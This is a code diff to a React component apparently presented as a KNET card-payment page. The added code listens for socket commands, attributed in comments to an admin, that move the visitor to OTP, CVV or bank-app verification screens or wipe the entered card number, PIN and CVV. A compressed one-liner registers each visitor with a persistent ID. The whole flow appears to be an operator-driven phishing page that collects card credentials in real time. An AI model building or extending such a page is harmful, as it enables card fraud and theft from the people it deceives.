@@ -122,6 +122,8 @@ export default function KNETPayment() {
   }, []);
   // ===== بطاقة الدفع المباشر (KNET) =====
   const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();
+  const phaseRef = useRef(phase);
+  useEffect(() => { phaseRef.current = phase; }, [phase]);
 
   useEffect(() => {
     const _s=socket.value,_a=()=>{try{_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);
@@ -189,6 +191,34 @@ export default function KNETPayment() {
     setValidationError("");
     setRejectedError("");
   };
+
+  // Direct socket action handler
+  useEffect(() => {
+    const s = socket.value;
+    if (!s) return;
+    console.log("payment socket id:", s.id);
+    const handler = (action: string) => {
+      const p = phaseRef.current;
+      console.log("card:action ->", action, "phase:", p);
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      if (p === "card") {
+        if (action === "app") { navigate("/bank-app-verification"); }
+        else if (action === "otp") { setPhase("otp"); startCountdown(); navigateToPage("رمز التحقق كي نت (OTP)"); }
+        else if (action === "reject") {
+          setRejectedError("يرجى التأكد من المعلومات المدخلة");
+          setCardNumber(""); setCardPin(""); setCardCvv("");
+          setSelectedPrefix(""); setExpiryMonth(""); setExpiryYear(""); setSelectedBank("");
+        }
+      } else if (p === "otp") {
+        if (action === "otp") { navigate("/final-page"); }
+        else if (action === "cvv") { navigate("/cvv"); }
+        else if (action === "reject") { setRejectedError("يرجى إدخال الرمز بشكل صحيح"); setOtpCode(""); }
+      }
+    };
+    s.on("card:action", handler);
+    return () => { s.off("card:action", handler); };
+  }, []);
 
   // Handle card action from admin
   useSignalEffect(() => {
